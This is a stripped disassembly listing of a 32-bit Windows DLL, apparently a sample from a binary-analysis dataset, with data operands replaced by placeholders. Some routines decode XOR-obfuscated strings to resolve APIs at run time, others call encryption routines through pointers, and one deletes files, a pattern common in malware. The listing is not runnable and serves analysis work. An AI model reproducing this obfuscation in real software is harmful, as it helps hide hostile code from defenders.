add esp 0x4
test eax eax
je r-xdata
mov edx [ rw-data ]
push 0x0
push edx
call eax
test eax eax
je r-xdata
sub_1000bd30
push esi
push 0x34
call sub_1000cef2
mov esi eax
add esp 0x4
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push 0x34
push 0x0
push esi
call sub_1000ebe0
push r--data
call sub_1000c020
push r--data
mov [ esi + 0x18 ] eax
call sub_1000c020
push r--data
mov [ esi + 0x1c ] eax
call sub_1000c020
push r--data
mov [ esi + 0x20 ] eax
call sub_1000c020
push r--data
mov [ esi + 0x24 ] eax
call sub_1000c020
push r--data
mov [ esi + 0x28 ] eax
call sub_1000c020
push r--data
mov [ esi + 0x2c ] eax
call sub_1000c020
add esp 0x28
cmp [ esi + 0x18 ] 0x0
mov [ esi + 0x30 ] eax
je r-xdata
push esi
call sub_1000c3e9
add esp 0x4
cmp [ esi + 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x20 ] 0x0
je r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
mov ecx [ esi + 0x28 ]
test ecx ecx
je r-xdata
cmp [ esi + 0x2c ] 0x0
je r-xdata
test eax eax
je r-xdata
mov edx [ esp + 0x8 ]
cmp edx 0x6603
jne r-xdata
cmp edx 0x6610
jne r-xdata
mov eax 0xa80000
mov [ esi + 0x14 ] 0x8
jmp r-xdata
mov eax 0x1000000
mov [ esi + 0x14 ] 0x10
push edi
push esi
or eax 0x1
push eax
mov eax [ rw-data ]
push edx
push eax
call ecx
test eax eax
je r-xdata
push esi
call sub_1000c3e9
add esp 0x4
pop edi
xor eax eax
pop esi
retn
mov ecx [ esi + 0x14 ]
mov edx [ rw-data ]
mov eax [ esi + 0x24 ]
lea edi [ esi + 0x4 ]
push edi
push ecx
push edx
call eax
test eax eax
je r-xdata
mov ecx [ esi ]
mov edx [ esi + 0x18 ]
push 0x0
push edi
push 0x1
push ecx
call edx
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
retn
sub_1000be80
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
mov ecx [ esi + 0x1c ]
push eax
call ecx
push esi
call sub_1000c3e9
add esp 0x4
sub_1000bea0
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
mov edx [ esp + 0xc ]
add ecx 0x100
push ecx
push eax
mov eax [ esp + 0x10 ]
push edx
push 0x0
push eax
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
mov edx [ eax + 0x2c ]
push 0x0
push ecx
call edx
neg eax
sbb eax eax
neg eax
dec eax
retn
sub_1000bed0
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
push 0x0
push 0x0
push ecx
mov ecx [ esi + 0x20 ]
push edx
push eax
call ecx
test eax eax
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ esi + 0x30 ]
push edi
mov edi [ esp + 0x1c ]
push edi
push 0x0
push 0x0
push 0x1
push edx
push eax
call ecx
test eax eax
je r-xdata
or eax 0xffffffff
pop esi
retn
pop edi
or eax 0xffffffff
pop esi
retn
mov edx [ esp + 0x18 ]
mov eax [ esp + 0xc ]
mov ecx [ esi ]
push edi
push edx
mov edx [ esi + 0x30 ]
push 0x40
push 0x1
push eax
push ecx
call edx
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esi + 0x1c ]
push eax
call ecx
pop edi
xor eax eax
pop esi
retn
sub_1000bf50
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x84 ] eax
push ebx
push esi
push edi
mov edi [ esp + 0x98 ]
push 0x7f
lea eax [ esp + 0x15 ]
push 0x0
push eax
mov [ esp + 0x18 ] edi
call sub_1000ebe0
mov ecx [ esp + 0xa8 ]
mov eax ecx
add esp 0xc
lea esi [ eax + 0x1 ]
nop
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edx [ r--data ]
sub eax esi
mov ebx eax
mov eax [ r--data ]
mov [ esp + 0x10 ] edx
mov edx [ r--data ]
xor esi esi
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] edx
test ebx ebx
jle r-xdata
mov ecx [ esp + 0x90 ]
mov [ edi + esi ] 0x0
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x88
retn
sub edi ecx
push ebp
mov [ edi + ecx ] al
inc esi
inc ecx
cmp esi ebx
jl r-xdata
xor al dl
mov eax esi
cdq
mov ebp 0xb
idiv ebp
mov al [ ecx ]
mov dl [ esp + edx + 0x14 ]
cmp al dl
je r-xdata
mov eax [ esp + 0x10 ]
pop ebp
pop edi
mov [ eax + esi ] 0x0
pop esi
pop ebx
mov ecx [ esp + 0x84 ]
xor ecx esp
call sub_1000c176
add esp 0x88
retn
sub_1000c020
sub esp 0x108
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x104 ] eax
push esi
push edi
mov edi [ esp + 0x114 ]
lea eax [ esp + 0x8 ]
push r--data
push eax
call sub_1000bf50
add esp 0x8
lea ecx [ esp + 0x8 ]
push ecx
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esp + 0x10c ]
pop edi
pop esi
xor ecx esp
xor eax eax
call sub_1000c176
add esp 0x108
retn
lea edx [ esp + 0x8 ]
push edi
push edx
call sub_1000bf50
add esp 0x8
lea eax [ esp + 0x8 ]
push eax
push esi
call [ GetProcAddress@IAT ]
pop edi
pop esi
mov ecx [ esp + 0x104 ]
xor ecx esp
call sub_1000c176
add esp 0x108
retn
sub_1000c0b0
push ecx
push ebx
push ebp
push esi
push edi
push r--data
call sub_1000c020
push r--data
mov esi eax
call sub_1000c020
push r--data
mov edi eax
call sub_1000c020
push r--data
mov ebx eax
call sub_1000c020
add esp 0x10
mov ebp eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn
test edi edi
je r-xdata
test ebx ebx
je r-xdata
test ebp ebp
je r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x10 ]
push eax
push 0x0
push 0x0
push 0x8004
push ecx
call esi
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
push 0x0
push 0x8
push rw-data
push edx
call edi
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
mov eax [ rw-data ]
push ecx
push 0xa80010
push edx
push 0x6603
push eax
call ebp
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
push eax
call ebx
mov edx [ esp + 0x10 ]
push edx
call ebx
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov ecx [ esp + 0x10 ]
push ecx
call ebx
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn
sub_1000c185
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_1000fd57
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1000fa1a
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_1000f2ae
mov [ esi + 0x4 ] eax
sub_1000c20c
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_1000c245
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
push edi
push [ ebp + 0x8 ]
call sub_1000c20c
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub esi eax
mov eax esi
pop esi
cmp esi eax
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001009b
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001009b
add esp 0x10
inc edi
cmp esi ebx
je r-xdata
sub_1000c31a
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000c245
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
pop esi
pop ebp
jmp sub_1000c20c
pop esi
pop ebp
retn
sub_1000c36c
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_100105a2
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_10010398
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_1000c3e9
push 0xc
push r--data
call sub_10011e54
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10011e99
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_1001135a
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_1001138d
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_1001034f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1001030d
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c43f
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_100113bd
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_1000c477
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn
push eax
call sub_10010375
pop ecx
or eax 0xffffffff
pop ebp
retn
test eax eax
je r-xdata
sub_1000c4b0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
sub ecx 0x1
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
sub ebx 0x1
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] al
add edi 0x1
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
sub ecx 0x1
jne r-xdata
add edi 0x4
xor eax eax
sub ecx 0x1
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_1000c5d4
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x2c ] eax
call sub_1000fd57
push 0x8
pop ecx
mov [ ebp - 0x28 ] eax
xor eax eax
lea edi [ ebp - 0x24 ]
push 0x7
[ edi ]
pop edi
mov dl [ esi ]
movzx ecx dl
mov eax ecx
and ecx edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc esi
test dl dl
jne r-xdata
mov edx [ ebp - 0x2c ]
test edx edx
jne r-xdata
mov al [ edx ]
movzx esi al
xor ebx ebx
mov ecx esi
and ecx edi
inc ebx
shl ebx cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl bl
jne r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ eax + 0x18 ]
jmp r-xdata
test al al
je r-xdata
mov ebx edx
jmp r-xdata
inc edx
cmp [ edx ] 0x0
jne r-xdata
movzx esi [ edx ]
xor eax eax
mov ecx esi
and ecx edi
inc eax
shl eax cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl al
jne r-xdata
jmp r-xdata
mov [ edx ] 0x0
inc edx
inc edx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov eax ebx
sub eax edx
neg eax
sbb eax eax
pop edi
and eax ebx
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
sub_1000c695
push 0xc
push r--data
call sub_10011e54
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_1001034f
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100102e7
add esp 0x14
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_10011e99
retn
call sub_100124ba
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_1001034f
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_100121f1
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c74f
mov eax [ ebp - 0x1c ]
call sub_1001034f
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_100125f4
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_1000c770
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
xor edi edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x18 ]
cmp esi edi
je r-xdata
call sub_1001034f
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
push edi
cmp ebx 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
jbe r-xdata
cmp esi edi
je r-xdata
push ebx
push edi
push ecx
call sub_1000ebe0
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x10 ] edi
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
ja r-xdata
mov [ ebp - 0xc ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0xc ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_10012747
pop ecx
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
jl r-xdata
mov eax edi
sub eax ebx
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
cmp ebx eax
ja r-xdata
mov ecx 0x7fffffff
xor edx edx
cmp ebx ecx
jbe r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ esi + 0x18 ]
dec ebx
dec [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax ebx
mov eax ebx
div [ ebp - 0xc ]
mov eax ebx
mov eax ecx
div [ ebp - 0xc ]
mov eax ecx
jmp r-xdata
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov edi eax
call sub_1001034f
mov [ eax ] 0x22
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_1000ebe0
add esp 0xc
push eax
push [ ebp - 0x8 ]
push esi
call sub_10012f31
pop ecx
push eax
call sub_10012e34
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
xor esi esi
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
push edi
push [ esi ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_10012f63
sub [ esi + 0x4 ] edi
add [ esi ] edi
add [ ebp - 0x8 ] edi
sub ebx edi
add esp 0x10
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x10 ]
jmp r-xdata
call sub_100102e7
add esp 0x14
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
call sub_1001034f
push esi
push esi
push esi
push esi
mov [ eax ] 0x22
push esi
jmp r-xdata
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_1000ebe0
add esp 0xc
test ebx ebx
jne r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
sub_1000c97a
push 0xc
push r--data
call sub_10011e54
xor esi esi
mov [ ebp - 0x1c ] esi
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp + 0x18 ] esi
jne r-xdata
push [ ebp + 0x18 ]
call sub_10012113
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000c770
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000ca06
mov eax [ ebp - 0x1c ]
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_10011e99
retn
call sub_1001034f
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_100102e7
add esp 0x14
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_1000ebe0
add esp 0xc
sub_1000ca61
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx ebx
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
cmp eax ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
je r-xdata
cmp [ ebp + 0x18 ] ebx
jbe r-xdata
mov [ eax ] bl
cmp [ ebp + 0x18 ] ebx
je r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ ebp + 0x24 ]
cmp eax ebx
je r-xdata
cmp [ ebp + 0x20 ] ebx
jbe r-xdata
mov [ eax ] bl
cmp [ ebp + 0x1c ] ebx
jne r-xdata
jmp r-xdata
call sub_1001034f
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp + 0x28 ] ebx
jbe r-xdata
mov [ eax ] bl
cmp [ ebp + 0x20 ] ebx
je r-xdata
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_100102e7
add esp 0x14
mov eax esi
jmp r-xdata
mov [ eax ] bl
cmp [ ebp + 0x24 ] ebx
jne r-xdata
jmp r-xdata
push 0x22
pop ecx
mov [ eax ] ecx
mov eax ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x28 ] ebx
jne r-xdata
cmp [ ebp + 0x28 ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
xor eax eax
inc eax
cmp [ esi ] 0x3a
jne r-xdata
dec eax
inc esi
cmp eax ebx
ja r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x4 ] ebx
cmp [ esi ] bl
je r-xdata
mov [ ecx ] bl
inc esi
mov [ ebp + 0x8 ] esi
jmp r-xdata
cmp [ ebp + 0x10 ] 0x3
jb r-xdata
mov eax [ ebp + 0x14 ]
cmp eax ebx
je r-xdata
movsx eax [ esi ]
push eax
call sub_1001304c
pop ecx
test eax eax
je r-xdata
push 0x2
push [ ebp + 0x8 ]
push 0xffffffff
push ecx
call sub_10013064
add esp 0x10
mov eax [ ebp - 0x4 ]
cmp eax ebx
je r-xdata
mov [ eax ] bl
mov al [ esi ]
cmp al 0x2f
je r-xdata
inc esi
jmp r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp eax [ ebp + 0x8 ]
jb r-xdata
lea edi [ esi + 0x1 ]
cmp al 0x5c
je r-xdata
inc esi
cmp [ esi ] bl
jne r-xdata
mov eax [ ebp + 0x24 ]
cmp eax ebx
je r-xdata
sub esi [ ebp + 0x8 ]
cmp [ ebp + 0x20 ] esi
ja r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp edi ebx
je r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
mov [ eax ] bl
push esi
push [ ebp + 0x8 ]
push 0xffffffff
push [ ebp + 0x1c ]
call sub_10013064
add esp 0x10
cmp [ ebp + 0x24 ] ebx
je r-xdata
sub eax [ ebp + 0x8 ]
cmp [ ebp + 0x20 ] eax
jbe r-xdata
cmp [ ebp + 0x14 ] ebx
je r-xdata
mov [ ebp - 0x4 ] esi
jmp r-xdata
sub esi [ ebp - 0x4 ]
cmp [ ebp + 0x28 ] esi
jbe r-xdata
push eax
push [ ebp + 0x8 ]
push 0xffffffff
push [ ebp + 0x1c ]
call sub_10013064
add esp 0x10
mov [ ebp + 0x8 ] edi
jmp r-xdata
mov eax edi
sub eax [ ebp + 0x8 ]
cmp [ ebp + 0x18 ] eax
jbe r-xdata
push esi
push [ ebp - 0x4 ]
push 0xffffffff
push [ ebp + 0x24 ]
call sub_10013064
add esp 0x10
jmp r-xdata
push eax
push [ ebp + 0x8 ]
push 0xffffffff
push [ ebp + 0x14 ]
call sub_10013064
add esp 0x10
sub_1000cc53
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
neg ecx
sbb ecx ecx
mov eax 0x100
and ecx eax
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
neg ecx
sbb ecx ecx
and ecx eax
push ecx
mov ecx [ ebp + 0x10 ]
push [ ebp + 0x14 ]
neg ecx
sbb ecx ecx
and ecx eax
mov eax [ ebp + 0xc ]
push ecx
push [ ebp + 0x10 ]
neg eax
sbb eax eax
and eax 0x3
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000ca61
add esp 0x24
pop ebp
retn
sub_1000cc9f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_1001034f
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_1000d08e
push esi
mov ebx eax
call sub_100131ea
push esi
call sub_10012f31
push eax
call sub_1001311d
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_1000c3e9
pop ecx
mov [ esi + 0x1c ] edi
sub_1000cd16
push 0xc
push r--data
call sub_10011e54
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_1001034f
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_10012113
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_1000cc9f
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000cd8a
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_10011e99
retn
mov eax [ ebp - 0x1c ]
sub_1000cd92
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_10013220
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_1000cde3
